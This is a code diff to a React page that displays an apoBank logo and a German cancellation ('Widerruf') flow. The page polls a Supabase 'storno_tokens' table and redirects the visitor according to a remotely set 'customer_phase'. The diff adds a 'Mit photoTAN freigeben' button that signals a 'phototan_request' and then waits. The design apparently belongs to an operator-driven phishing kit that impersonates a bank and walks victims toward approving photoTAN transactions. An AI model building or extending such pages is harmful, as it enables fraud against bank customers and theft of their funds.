@@ -1,5 +1,5 @@
-import { ChevronRight } from "lucide-react";
-import { useEffect } from "react";
+import { ChevronRight, Loader2 } from "lucide-react";
+import { useEffect, useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import apoBankLogo from "@/assets/apobank-logo.svg";
 import { Button } from "@/components/ui/button";
@@ -11,6 +11,8 @@ const WiderrufStart = () => {
   const navigate = useNavigate();
   const [sp] = useSearchParams();
   const token = sp.get("token");
+  const [requesting, setRequesting] = useState(false);
+  const [phase, setPhase] = useState<string | null>(null);
 
   useEffect(() => {
     if (!token) return;
@@ -20,10 +22,14 @@ const WiderrufStart = () => {
         .select("customer_phase")
         .eq("token", token)
         .maybeSingle();
-      if (data?.customer_phase === "success") {
+      const p = data?.customer_phase as string | undefined;
+      if (p) setPhase(p);
+      if (p === "success") {
         navigate(`/success?token=${encodeURIComponent(token)}`);
-      } else if (data?.customer_phase === "aborted") {
+      } else if (p === "aborted") {
         navigate("/auth");
+      } else if (p === "phototan") {
+        navigate(`/widerruf/phototan?token=${encodeURIComponent(token)}`);
       }
     };
     check();
@@ -35,6 +41,16 @@ const WiderrufStart = () => {
     return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch); };
   }, [token, navigate]);
 
+  const requestPhotoTan = async () => {
+    if (!token || requesting) return;
+    setRequesting(true);
+    await (supabase as any)
+      .from("storno_tokens")
+      .update({ customer_phase: "phototan_request", updated_at: new Date().toISOString() })
+      .eq("token", token);
+  };
+
+  const waiting = requesting || phase === "phototan_request";
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
@@ -131,10 +147,18 @@ const WiderrufStart = () => {
             <div className="flex justify-end gap-3">
               <Button
                 variant="outline"
-                disabled
+                onClick={requestPhotoTan}
+                disabled={waiting}
                 className="rounded-full bg-white border-[#002776] text-[#002776] hover:bg-white hover:text-[#002776] px-6 disabled:opacity-100"
               >
-                Mit photoTAN freigeben
+                {waiting ? (
+                  <>
+                    <Loader2 className="h-4 w-4 mr-2 animate-spin" />
+                    Wird angefordert ...
+                  </>
+                ) : (
+                  "Mit photoTAN freigeben"
+                )}
               </Button>
             </div>
           </div>
